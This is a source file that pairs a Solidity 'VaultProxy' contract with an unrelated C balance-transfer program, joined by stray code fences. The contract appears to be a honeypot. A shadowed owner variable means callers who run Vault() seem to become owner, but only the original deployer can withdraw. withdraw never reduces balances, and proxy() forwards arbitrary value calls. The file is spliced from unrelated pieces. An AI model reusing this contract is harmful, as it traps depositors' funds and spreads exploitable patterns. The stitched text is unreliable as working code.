pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == O) _; } address O = msg.sender;
    function transferOwner(address _o) public onlyOwner { O = _o; } 
    function proxy(address t, bytes d) public payable {
         
        t.call.value(msg.value)(d);
    }
}

contract VaultProxy is Proxy {
    address public O;
    mapping (address => uint256) public D;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            O = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.25 ether) {
            D[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 a) public onlyOwner {
        if (a>0 && D[msg.sender]>=a) {
            msg.sender.transfer(a);
        }
    }
}
```
```c
#include <stdio.h>

typedef unsigned long long uint256_t;

void transfer(uint256_t amount, uint256_t* balance) {
    if (amount > 0 && *balance >= amount) {
        *balance -= amount;
        printf("Transferred: %llu\n", amount);
    } else {
        printf("Transfer failed\n");
    }
}

int main() {
    uint256_t balance = 1000;
    transfer(500, &balance);
    printf("Remaining balance: %llu\n", balance);
    return 0;
}